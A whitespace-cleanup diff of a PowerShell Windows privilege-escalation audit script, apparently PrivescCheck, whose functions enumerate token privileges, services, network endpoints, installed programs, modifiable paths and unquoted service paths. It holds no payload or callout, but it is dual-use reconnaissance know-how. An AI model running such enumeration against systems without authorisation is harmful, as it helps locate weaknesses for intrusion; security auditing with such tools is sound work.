@@ -14,7 +14,7 @@ $global:ResultArrayList = New-Object -TypeName System.Collections.ArrayList
 # ----------------------------------------------------------------
 
 # ----------------------------------------------------------------
-# Win32 stuff  
+# Win32 stuff
 # ----------------------------------------------------------------
 #region Win32
 $CSharpSource = @'
@@ -344,22 +344,22 @@ public static extern uint WlanGetProfile(IntPtr clientHandle, [MarshalAs(Unmanag
 
 try {
     # Is the Type already defined?
-    [PrivescCheck.Win32] | Out-Null 
+    [PrivescCheck.Win32] | Out-Null
 } catch {
-    # If not, create it by compiling the C# code in memory 
+    # If not, create it by compiling the C# code in memory
     $CompilerParameters = New-Object -TypeName System.CodeDom.Compiler.CompilerParameters
     $CompilerParameters.GenerateInMemory = $True
-    $CompilerParameters.GenerateExecutable = $False 
+    $CompilerParameters.GenerateExecutable = $False
     #$Compiler = New-Object -TypeName Microsoft.CSharp.CSharpCodeProvider
-    #$Compiler.CompileAssemblyFromSource($CompilerParameters, $CSharpSource) 
+    #$Compiler.CompileAssemblyFromSource($CompilerParameters, $CSharpSource)
     Add-Type -MemberDefinition $CSharpSource -Name 'Win32' -Namespace 'PrivescCheck' -Language CSharp -CompilerParameters $CompilerParameters
 }
 #endregion Win32
 
 # ----------------------------------------------------------------
-# Helpers 
+# Helpers
 # ----------------------------------------------------------------
-#region Helpers 
+#region Helpers
 
 function Convert-SidToName {
     <#
@@ -369,22 +369,22 @@ function Convert-SidToName {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    This helper function takes a user SID as an input parameter and returns the account name 
+    This helper function takes a user SID as an input parameter and returns the account name
     associated to this SID. If an account name cannot be found, nothing is returned.
-    
+
     .PARAMETER Sid
 
     A user account SID, e.g.: S-1-5-18.
-    
+
     .EXAMPLE
     An example
     PS C:\> Convert-SidToName -Sid S-1-5-18"
 
     NT AUTHORITY\SYSTEM
-    
+
     #>
 
     [CmdletBinding()] param(
@@ -407,23 +407,23 @@ function Convert-DateToString {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    The output string is a simplified version of the ISO format: YYYY-MM-DD hh:mm:ss. 
-    
+    The output string is a simplified version of the ISO format: YYYY-MM-DD hh:mm:ss.
+
     .PARAMETER Date
 
     A System.DateTime object
-    
+
     .EXAMPLE
 
     PS C:\> $Date = Get-Date; Convert-DateToString -Date $Date
 
     2020-01-16 - 10:26:11
-    
+
     #>
-    
+
     [CmdletBinding()] param(
         [System.DateTime]
         $Date
@@ -443,24 +443,24 @@ function Convert-ServiceTypeToString {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     Services have a type which is saved as an integer in the registry. This function will retrieve
     the "name" of the type based on this integer value.
-    
+
     .PARAMETER ServiceType
 
     A service type as an integer
-    
+
     .EXAMPLE
 
     PS C:\> Convert-ServiceTypeToString -ServiceType 16
-    
+
     Win32OwnProcess
-    
+
     #>
-    
+
     [CmdletBinding()] param(
         [int]
         $ServiceType
@@ -476,8 +476,8 @@ function Convert-ServiceTypeToString {
         "InteractiveProcess" =  "256";
     }
 
-    $ServiceTypeEnum.GetEnumerator() | ForEach-Object { 
-        if ( $_.value -band $ServiceType ) 
+    $ServiceTypeEnum.GetEnumerator() | ForEach-Object {
+        if ( $_.value -band $ServiceType )
         {
             $_.name
         }
@@ -492,16 +492,16 @@ function Convert-ServiceStartModeToString {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     Services have a Start mode (e.g.: Automatic), which is saved as an integer in the registry.
-    This function will retrieve the "name" of the Start mode based on this integer value. 
-    
+    This function will retrieve the "name" of the Start mode based on this integer value.
+
     .PARAMETER StartMode
 
     A Start mode as an integer
-    
+
     .EXAMPLE
 
     PS C:\> Convert-ServiceStartModeToString -StartMode 2
@@ -509,7 +509,7 @@ function Convert-ServiceStartModeToString {
     Automatic
 
     #>
-    
+
     [CmdletBinding()] param(
         [int]
         $StartMode
@@ -523,8 +523,8 @@ function Convert-ServiceStartModeToString {
         "Disabled" =    "4";
     }
 
-    $StartModeEnum.GetEnumerator() | ForEach-Object { 
-        if ( $_.Value -eq $StartMode ) 
+    $StartModeEnum.GetEnumerator() | ForEach-Object {
+        if ( $_.Value -eq $StartMode )
         {
             $_.Name
         }
@@ -539,7 +539,7 @@ function Test-IsKnownService {
 
     if ($Service) {
 
-        $ImagePath = $Service.ImagePath        
+        $ImagePath = $Service.ImagePath
 
         $SeparationCharacterSets = @('"', "'", ' ', "`"'", '" ', "' ", "`"' ")
 
@@ -550,14 +550,14 @@ function Test-IsKnownService {
             ForEach($CandidatePath in $CandidatePaths) {
 
                 $TempPath = $([System.Environment]::ExpandEnvironmentVariables($CandidatePath))
-                $TempPathResolved = Resolve-Path -Path $TempPath -ErrorAction SilentlyContinue -ErrorVariable ErrorResolvePath 
+                $TempPathResolved = Resolve-Path -Path $TempPath -ErrorAction SilentlyContinue -ErrorVariable ErrorResolvePath
                 if (-not $ErrorResolvePath) {
 
-                    $File = Get-Item -Path $TempPathResolved -ErrorAction SilentlyContinue -ErrorVariable ErrorGetItem 
+                    $File = Get-Item -Path $TempPathResolved -ErrorAction SilentlyContinue -ErrorVariable ErrorGetItem
                     if (-not $ErrorGetItem) {
 
                         if ($File.VersionInfo.LegalCopyright -Like "*Microsoft Corporation*") {
-                            return $True 
+                            return $True
                         } else {
                             return $False
                         }
@@ -574,18 +574,18 @@ function Get-UserPrivileges {
     <#
     .SYNOPSIS
 
-    Helper - Enumerates the privileges of the current user 
+    Helper - Enumerates the privileges of the current user
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    Enumerates the privileges of the current user using the Windows API. First, it gets a handle 
+    Enumerates the privileges of the current user using the Windows API. First, it gets a handle
     to the current access token using OpenProcessToken. Then it calls GetTokenInformation to list
     all the privileges that it contains along with their state (enabled/disabled). For each result
-    a custom object is returned, indicating the name of the privilege and its state. 
-    
+    a custom object is returned, indicating the name of the privilege and its state.
+
     .EXAMPLE
 
     PS C:\> Get-UserPrivileges
@@ -602,7 +602,7 @@ function Get-UserPrivileges {
 
     https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
     #>
-    
+
     [CmdletBinding()] param()
 
     function Get-PrivilegeDescription {
@@ -654,11 +654,11 @@ function Get-UserPrivileges {
 
     }
 
-    # Get a handle to a process the current user owns 
+    # Get a handle to a process the current user owns
     $ProcessHandle = [PrivescCheck.Win32]::GetCurrentProcess()
     Write-Verbose "Current process handle: $ProcessHandle"
 
-    # Get a handle to the token corresponding to this process 
+    # Get a handle to the token corresponding to this process
     $TOKEN_QUERY= 0x0008
     [IntPtr]$TokenHandle = [IntPtr]::Zero
     $Success = [PrivescCheck.Win32]::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$TokenHandle);
@@ -684,18 +684,18 @@ function Get-UserPrivileges {
 
             if ($Success) {
 
-                # Convert the unmanaged memory at offset $TokenPrivilegesPtr to a TOKEN_PRIVILEGES managed type 
+                # Convert the unmanaged memory at offset $TokenPrivilegesPtr to a TOKEN_PRIVILEGES managed type
                 $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [type] [PrivescCheck.Win32+TOKEN_PRIVILEGES])
                 $Offset = [IntPtr] ($TokenPrivilegesPtr.ToInt64() + 4)
-                
+
                 Write-Verbose "GetTokenInformation() OK - Privilege count: $($TokenPrivileges.PrivilegeCount)"
 
                 For ($i = 0; $i -lt $TokenPrivileges.PrivilegeCount; $i++) {
 
-                    # Cast the unmanaged memory at offset 
+                    # Cast the unmanaged memory at offset
                     $LuidAndAttributes = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Offset, [type] [PrivescCheck.Win32+LUID_AND_ATTRIBUTES])
-                    
-                    # Copy LUID to unmanaged memory 
+
+                    # Copy LUID to unmanaged memory
                     $LuidSize = [System.Runtime.InteropServices.Marshal]::SizeOf($LuidAndAttributes.Luid)
                     [IntPtr]$LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidSize)
                     [System.Runtime.InteropServices.Marshal]::StructureToPtr($LuidAndAttributes.Luid, $LuidPtr, $True)
@@ -722,7 +722,7 @@ function Get-UserPrivileges {
 
                             Write-Verbose "LookupPrivilegeName() OK - Name: $PrivilegeName - Enabled: $PrivilegeEnabled"
 
-                            $PrivilegeObject = New-Object -TypeName PSObject 
+                            $PrivilegeObject = New-Object -TypeName PSObject
                             $PrivilegeObject | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $PrivilegeName
                             $PrivilegeObject | Add-Member -MemberType "NoteProperty" -Name "State" -Value $(if ($PrivilegeEnabled) { "Enabled" } else { "Disabled" })
                             $PrivilegeObject | Add-Member -MemberType "NoteProperty" -Name "Description" -Value $(Get-PrivilegeDescription -Name $PrivilegeName)
@@ -754,7 +754,7 @@ function Get-UserPrivileges {
             Write-Verbose ([ComponentModel.Win32Exception] $LastError)
         }
 
-        # Cleanup - Close Token handle 
+        # Cleanup - Close Token handle
         $Success = [PrivescCheck.Win32]::CloseHandle($TokenHandle)
         $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
         if ($Success) {
@@ -776,18 +776,18 @@ function Get-UserFromProcess() {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     First it gets a handle to the process identified by the given PID. Then, it uses this handle to
     access the process token. GetTokenInformation() is then used to query the SID of the user.
     Finally the SID is converted to a domain name, user name and SID type. All this information is
-    returned in a custom PS object. 
-    
+    returned in a custom PS object.
+
     .PARAMETER ProcessId
 
     The PID of the target process
-    
+
     .EXAMPLE
 
     PS C:\> Get-UserFromProcess -ProcessId 6972
@@ -795,9 +795,9 @@ function Get-UserFromProcess() {
     Domain          Username Type
     ------          -------- ----
     DESKTOP-FEOHNOM lab-user User
-    
+
     #>
-    
+
     [CmdletBinding()] param(
         [Parameter(Mandatory=$true)]
         [int]
@@ -823,8 +823,8 @@ function Get-UserFromProcess() {
             "LogonSession" = "11";
         }
 
-        $SidTypeEnum.GetEnumerator() | ForEach-Object { 
-            if ( $_.value -eq $SidType ) 
+        $SidTypeEnum.GetEnumerator() | ForEach-Object {
+            if ( $_.value -eq $SidType )
             {
                 $_.name
             }
@@ -861,13 +861,13 @@ function Get-UserFromProcess() {
                 [IntPtr]$TokenUserPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenUserPtrSize)
 
                 $Success = [PrivescCheck.Win32]::GetTokenInformation($TokenHandle, 1, $TokenUserPtr, $TokenUserPtrSize, [ref]$TokenUserPtrSize)
-                $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error() 
+                $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
 
                 if ($Success) {
 
                     Write-Verbose "GetTokenInformation() OK"
 
-                    # Cast unmanaged memory to managed TOKEN_USER struct 
+                    # Cast unmanaged memory to managed TOKEN_USER struct
                     $TokenUser = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenUserPtr, [type] [PrivescCheck.Win32+TOKEN_USER])
 
                     $SidType = 0
@@ -885,13 +885,13 @@ function Get-UserFromProcess() {
 
                     if ($Success) {
 
-                        $UserObject = New-Object -TypeName PSObject 
+                        $UserObject = New-Object -TypeName PSObject
                         $UserObject | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value $UserDomain.ToString()
                         $UserObject | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $UserName.ToString()
                         $UserObject | Add-Member -MemberType "NoteProperty" -Name "DisplayName" -Value "$($UserDomain.ToString())\$($UserName.ToString())"
                         $UserObject | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $(Get-SidTypeName $SidType)
                         $UserObject
-                        
+
                     } else {
                         Write-Verbose "LookupAccountSid() failed."
                         Write-Verbose ([ComponentModel.Win32Exception] $LastError)
@@ -901,11 +901,11 @@ function Get-UserFromProcess() {
                     Write-Verbose ([ComponentModel.Win32Exception] $LastError)
                 }
 
-                # Cleanup - Free unmanaged memory 
+                # Cleanup - Free unmanaged memory
                 [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenUserPtr)
             }
 
-            # Cleanup - Close token handle 
+            # Cleanup - Close token handle
             $Success = [PrivescCheck.Win32]::CloseHandle($TokenHandle)
             $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
             if ($Success) {
@@ -917,7 +917,7 @@ function Get-UserFromProcess() {
             Write-Verbose "Can't open token for process with PID $ProcessId"
         }
 
-        # Cleanup - Close process handle 
+        # Cleanup - Close process handle
         $Success = [PrivescCheck.Win32]::CloseHandle($ProcessHandle)
         $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
         if ($Success) {
@@ -938,20 +938,20 @@ function Get-NetworkEndpoints {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    It uses the 'GetExtendedTcpTable' and 'GetExtendedUdpTable' functions of the Windows API to 
-    list the TCP/UDP endpoints on the local machine. It handles both IPv4 and IPv6. For each 
+    It uses the 'GetExtendedTcpTable' and 'GetExtendedUdpTable' functions of the Windows API to
+    list the TCP/UDP endpoints on the local machine. It handles both IPv4 and IPv6. For each
     entry in the table, a custom PS object is returned, indicating the IP version (IPv4/IPv6),
-    the protocol (TCP/UDP), the local address (e.g.: "0.0.0.0:445"), the state, the PID of the 
+    the protocol (TCP/UDP), the local address (e.g.: "0.0.0.0:445"), the state, the PID of the
     associated process and the name of the process. The name of the process is retrieved through
     a call to "Get-Process -PID <PID>".
-    
+
     .EXAMPLE
 
     PS C:\> Get-NetworkEndpoints | ft
-    
+
     IP   Proto LocalAddress LocalPort Endpoint         State       PID Name
     --   ----- ------------ --------- --------         -----       --- ----
     IPv4 TCP   0.0.0.0            135 0.0.0.0:135      LISTENING  1216 svchost
@@ -964,12 +964,12 @@ function Get-NetworkEndpoints {
     IPv4 TCP   0.0.0.0          49668 0.0.0.0:49668    LISTENING  2972 svchost
     IPv4 TCP   0.0.0.0          49669 0.0.0.0:49669    LISTENING  4480 spoolsv
     IPv4 TCP   0.0.0.0          49670 0.0.0.0:49670    LISTENING   964 services
-    
+
     .EXAMPLE
 
     PS C:\> Get-NetworkEndpoints -UDP -IPv6 | ft
 
-    IP   Proto LocalAddress LocalPort Endpoint    State  PID Name       
+    IP   Proto LocalAddress LocalPort Endpoint    State  PID Name
     --   ----- ------------ --------- --------    -----  --- ----
     IPv6 UDP   ::                 500 [::]:500    N/A   5000 svchost
     IPv6 UDP   ::                3702 [::]:3702   N/A   4128 dasHost
@@ -977,20 +977,20 @@ function Get-NetworkEndpoints {
     IPv6 UDP   ::                4500 [::]:4500   N/A   5000 svchost
     IPv6 UDP   ::               62212 [::]:62212  N/A   4128 dasHost
     IPv6 UDP   ::1               1900 [::1]:1900  N/A   5860 svchost
-    IPv6 UDP   ::1              63168 [::1]:63168 N/A   5860 svchost 
+    IPv6 UDP   ::1              63168 [::1]:63168 N/A   5860 svchost
     #>
 
     [CmdletBinding()] param(
         [switch]
-        $IPv6 = $False, # IPv4 by default 
+        $IPv6 = $False, # IPv4 by default
         [switch]
-        $UDP = $False # TCP by default 
+        $UDP = $False # TCP by default
     )
 
     $AF_INET6 = 23
     $AF_INET = 2
-    
-    if ($IPv6) { 
+
+    if ($IPv6) {
         $IpVersion = $AF_INET6
     } else {
         $IpVersion = $AF_INET
@@ -1025,19 +1025,19 @@ function Get-NetworkEndpoints {
         if ($Result -eq 0) {
 
             if ($UDP) {
-                if ($IpVersion -eq $AF_INET) { 
+                if ($IpVersion -eq $AF_INET) {
                     $Table = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TablePtr, [type] [PrivescCheck.Win32+MIB_UDPTABLE_OWNER_PID])
-                } elseif ($IpVersion -eq $AF_INET6) { 
+                } elseif ($IpVersion -eq $AF_INET6) {
                     $Table = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TablePtr, [type] [PrivescCheck.Win32+MIB_UDP6TABLE_OWNER_PID])
                 }
             } else {
-                if ($IpVersion -eq $AF_INET) { 
+                if ($IpVersion -eq $AF_INET) {
                     $Table = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TablePtr, [type] [PrivescCheck.Win32+MIB_TCPTABLE_OWNER_PID])
-                } elseif ($IpVersion -eq $AF_INET6) { 
+                } elseif ($IpVersion -eq $AF_INET6) {
                     $Table = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TablePtr, [type] [PrivescCheck.Win32+MIB_TCP6TABLE_OWNER_PID])
                 }
             }
-            
+
             $NumEntries = $Table.dwNumEntries
 
             Write-Verbose "GetExtendedProtoTable() OK - NumEntries: $NumEntries"
@@ -1073,7 +1073,7 @@ function Get-NetworkEndpoints {
                     $LocalAddress = "[$($LocalAddr)]:$($LocalPort)"
                 }
 
-                $ListenerObject = New-Object -TypeName PSObject 
+                $ListenerObject = New-Object -TypeName PSObject
                 $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "IP" -Value $(if ($IpVersion -eq $AF_INET) { "IPv4" } else { "IPv6" } )
                 $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "Proto" -Value $(if ($UDP) { "UDP" } else { "TCP" } )
                 $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "LocalAddress" -Value $LocalAddr
@@ -1102,23 +1102,23 @@ function Get-InstalledPrograms {
     <#
     .SYNOPSIS
 
-    Helper - Enumerates the installed applications 
+    Helper - Enumerates the installed applications
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    This looks for applications installed in the common "Program Files" and "Program Files (x86)" 
+    This looks for applications installed in the common "Program Files" and "Program Files (x86)"
     folders. It also enumerates installed applications thanks to the registry by looking for all
     the subkeys in "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall".
 
     .PARAMETER Filtered
 
-    If True, only non-default applications are returned. Otherwise, all the applications are 
+    If True, only non-default applications are returned. Otherwise, all the applications are
     returned. The filter is base on a list of known applications which are known to be installed
     by default (e.g.: "Windows Defender").
-    
+
     .EXAMPLE
 
     PS C:\> Get-InstalledPrograms -Filtered
@@ -1127,9 +1127,9 @@ function Get-InstalledPrograms {
     ----                -------------     ------ ----
     d----        29/11/2019     10:51            Npcap
     d----        29/11/2019     10:51            Wireshark
-    
+
     #>
-    
+
     [CmdletBinding()] param(
         [switch]
         $Filtered = $False
@@ -1142,14 +1142,14 @@ function Get-InstalledPrograms {
     $InstalledPrograms = New-Object System.Collections.ArrayList
 
     $PathProgram32 = Join-Path -Path $env:SystemDrive -ChildPath "Program Files (x86)"
-    $PathProgram64 = Join-Path -Path $env:SystemDrive -ChildPath "Program Files" 
+    $PathProgram64 = Join-Path -Path $env:SystemDrive -ChildPath "Program Files"
 
     $Items = Get-ChildItem -Path $PathProgram32,$PathProgram64 -ErrorAction SilentlyContinue
     if ($Items) {
         [void]$InstalledPrograms.AddRange($Items)
     }
-    
-    $RegInstalledPrograms = Get-ChildItem -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" 
+
+    $RegInstalledPrograms = Get-ChildItem -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
     $RegInstalledPrograms6432 = Get-ChildItem -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" -ErrorAction SilentlyContinue
     if ($RegInstalledPrograms6432) { $RegInstalledPrograms += $RegInstalledPrograms6432 }
     ForEach ($InstalledProgram in $RegInstalledPrograms) {
@@ -1159,9 +1159,9 @@ function Get-InstalledPrograms {
                 if ($InstallLocation[$InstallLocation.Length - 1] -eq "\") {
                     $InstallLocation = $InstallLocation.SubString(0, $InstallLocation.Length - 1)
                 }
-                $FileObject = Get-Item -Path $InstallLocation -ErrorAction SilentlyContinue -ErrorVariable GetItemError 
+                $FileObject = Get-Item -Path $InstallLocation -ErrorAction SilentlyContinue -ErrorVariable GetItemError
                 if ($GetItemError) {
-                    continue 
+                    continue
                 }
                 if ($FileObject -is [System.IO.DirectoryInfo]) {
                     continue
@@ -1198,7 +1198,7 @@ function Get-ServiceFromRegistry {
         [string]$Name
     )
 
-    $ServicesRegPath = "HKLM\SYSTEM\CurrentControlSet\Services" 
+    $ServicesRegPath = "HKLM\SYSTEM\CurrentControlSet\Services"
     $ServiceRegPath = Join-Path -Path $ServicesRegPath -ChildPath $Name
 
     $ServiceProperties = Get-ItemProperty -Path "Registry::$ServiceRegPath" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
@@ -1206,11 +1206,11 @@ function Get-ServiceFromRegistry {
 
         $DisplayName = [System.Environment]::ExpandEnvironmentVariables($ServiceProperties.DisplayName)
 
-        $ServiceItem = New-Object -TypeName PSObject 
+        $ServiceItem = New-Object -TypeName PSObject
         $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $ServiceProperties.PSChildName
         $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "DisplayName" -Value $DisplayName
-        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "User" -Value $ServiceProperties.ObjectName 
-        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $ServiceProperties.ImagePath 
+        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "User" -Value $ServiceProperties.ObjectName
+        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $ServiceProperties.ImagePath
         $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "StartMode" -Value $(Convert-ServiceStartModeToString -StartMode $ServiceProperties.Start)
         $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $(Convert-ServiceTypeToString -ServiceType $Properties.Type)
         $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RegistryKey" -Value $ServiceProperties.Name
@@ -1227,23 +1227,23 @@ function Get-ServiceList {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    This uses the registry to enumerate the services by looking for the subkeys of 
+    This uses the registry to enumerate the services by looking for the subkeys of
     "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services". This allows any user to get information
     about all the services. So, even if non-privileged users can't access the details of a service
     through the Service Control Manager, they can do so simply by accessing the registry.
-    
+
     .PARAMETER FilterLevel
 
-    This parameter can be used to filter out the result returned by the function based on the 
+    This parameter can be used to filter out the result returned by the function based on the
     following criteria:
-        FilterLevel = 0 - No filtering 
+        FilterLevel = 0 - No filtering
         FilterLevel = 1 - Exclude 'Services with empty ImagePath'
-        FilterLevel = 2 - Exclude 'Services with empty ImagePath' + 'Drivers' 
-        FilterLevel = 3 - Exclude 'Services with empty ImagePath' + 'Drivers' + 'Known services' 
-    
+        FilterLevel = 2 - Exclude 'Services with empty ImagePath' + 'Drivers'
+        FilterLevel = 3 - Exclude 'Services with empty ImagePath' + 'Drivers' + 'Known services'
+
     .EXAMPLE
 
     PS C:\> Get-ServiceList -FilterLevel 3
@@ -1256,7 +1256,7 @@ function Get-ServiceList {
     Type         : Win32OwnProcess
     RegistryKey  : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VMTools
     RegistryPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VMTools
-    
+
     .NOTES
 
     A service "Type" can be one of the following:
@@ -1265,11 +1265,11 @@ function Get-ServiceList {
         Adapter = 4
         RecognizerDriver = 8
         Win32OwnProcess = 16
-        Win32ShareProcess = 32 
+        Win32ShareProcess = 32
         InteractiveProcess = 256
 
     #>
-    
+
     [CmdletBinding()] param(
         [Parameter(Mandatory=$true)]
         [ValidateSet(0,1,2,3)]
@@ -1279,31 +1279,31 @@ function Get-ServiceList {
 
     if ($CachedServiceList.Count -eq 0) {
 
-        # If the cached service list hasn't been initialized yet, enumerate all services and 
+        # If the cached service list hasn't been initialized yet, enumerate all services and
         # populate the cache.
 
-        $ServicesRegPath = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services" 
+        $ServicesRegPath = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services"
         $RegAllServices = Get-ChildItem -Path $ServicesRegPath -ErrorAction SilentlyContinue
 
         ForEach ($RegService in $RegAllServices) {
 
             $Properties = Get-ItemProperty -Path $RegService.PSPath -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
             if ($GetItemPropertyError) {
-                # If an error occurred, skip the current item 
-                continue 
+                # If an error occurred, skip the current item
+                continue
             }
 
             $DisplayName = [System.Environment]::ExpandEnvironmentVariables($Properties.DisplayName)
 
-            $ServiceItem = New-Object -TypeName PSObject 
+            $ServiceItem = New-Object -TypeName PSObject
             $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Properties.PSChildName
             $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "DisplayName" -Value $DisplayName
-            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "User" -Value $Properties.ObjectName 
-            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $Properties.ImagePath 
+            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "User" -Value $Properties.ObjectName
+            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $Properties.ImagePath
             $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "StartMode" -Value $(Convert-ServiceStartModeToString -StartMode $Properties.Start)
             $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $(Convert-ServiceTypeToString -ServiceType $Properties.Type)
             $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RegistryKey" -Value $RegService.Name
-            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RegistryPath" -Value $RegService.PSPath 
+            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RegistryPath" -Value $RegService.PSPath
 
             [void] $CachedServiceList.Add($ServiceItem)
         }
@@ -1311,10 +1311,10 @@ function Get-ServiceList {
 
     ForEach ($ServiceItem in $CachedServiceList) {
 
-        # FilterLevel = 0 - Add the service to the list and go to the next one 
+        # FilterLevel = 0 - Add the service to the list and go to the next one
         if ($FilterLevel -eq 0) {
             $ServiceItem
-            continue 
+            continue
         }
 
         if ($ServiceItem.ImagePath -and (-not ($ServiceItem.ImagePath.trim() -eq ''))) {
@@ -1322,12 +1322,12 @@ function Get-ServiceList {
             # FilterLevel = 1 - Add the service to the list of its ImagePath is not empty
             if ($FilterLevel -le 1) {
                 $ServiceItem
-                continue 
+                continue
             }
 
             if (@("Win32OwnProcess", "Win32ShareProcess", "InteractiveProcess") -contains $ServiceItem.Type) {
 
-                # FilterLevel = 2 - Add the service to the list if it's not a driver 
+                # FilterLevel = 2 - Add the service to the list if it's not a driver
                 if ($FilterLevel -le 2) {
                     $ServiceItem
                     continue
@@ -1335,7 +1335,7 @@ function Get-ServiceList {
 
                 if (-not (Test-IsKnownService -Service $ServiceItem)) {
 
-                    # FilterLevel = 3 - Add the service if it's not a built-in Windows service 
+                    # FilterLevel = 3 - Add the service if it's not a built-in Windows service
                     if ($FilterLevel -le 3) {
                         $ServiceItem
                         continue
@@ -1367,7 +1367,7 @@ function Get-ModifiablePath {
     comparison set against the parsed path DACLs.
 
     @itm4n: I made some small changes to the original code in order to prevent false positives as
-    much as possible. 
+    much as possible.
 
     .PARAMETER Path
 
@@ -1396,7 +1396,7 @@ function Get-ModifiablePath {
     C:\Vuln\config.ini         {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
     ...
     #>
-    
+
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
@@ -1472,7 +1472,7 @@ function Get-ModifiablePath {
             }
             else {
                 $TargetPath = $([System.Environment]::ExpandEnvironmentVariables($TargetPath)).Trim()
-                
+
                 ForEach($SeparationCharacterSet in $SeparationCharacterSets) {
                     $TargetPath.Split($SeparationCharacterSet) | Where-Object {$_ -and ($_.trim() -ne '')} | ForEach-Object {
 
@@ -1481,12 +1481,12 @@ function Get-ModifiablePath {
                             if($SeparationCharacterSet -notmatch ' ') {
 
                                 $TempPath = $([System.Environment]::ExpandEnvironmentVariables($_)).Trim()
-    
-                                # if the path is actually an option like '/svc', skip it 
-                                # it will prevent a lot of false positives but it might also skip vulnerable paths in some particular cases 
-                                # though, it's more common to see options like '/svc' than file paths like '/ProgramData/something' in Windows 
-                                if ((-not ($TempPath -Like "/*")) -and (-not ($TempPath -match "^[A-Z]:`$"))) { 
-    
+
+                                # if the path is actually an option like '/svc', skip it
+                                # it will prevent a lot of false positives but it might also skip vulnerable paths in some particular cases
+                                # though, it's more common to see options like '/svc' than file paths like '/ProgramData/something' in Windows
+                                if ((-not ($TempPath -Like "/*")) -and (-not ($TempPath -match "^[A-Z]:`$"))) {
+
                                     if($TempPath -and ($TempPath -ne '')) {
                                         if (Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                                             # if the path exists, resolve it and add it to the candidate list
@@ -1520,7 +1520,7 @@ function Get-ModifiablePath {
                 $CandidatePath = $_
 
                 try {
-                
+
                     Get-Acl -Path $CandidatePath | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {
 
                         $FileSystemRights = $_.FileSystemRights.value__
@@ -1568,15 +1568,15 @@ function Get-ExploitableUnquotedPath {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     Parse a path, determine if it's "unquoted" and check whether it's exploitable.
-    
+
     .PARAMETER Path
 
     A path (or a command line for example)
-    
+
     #>
 
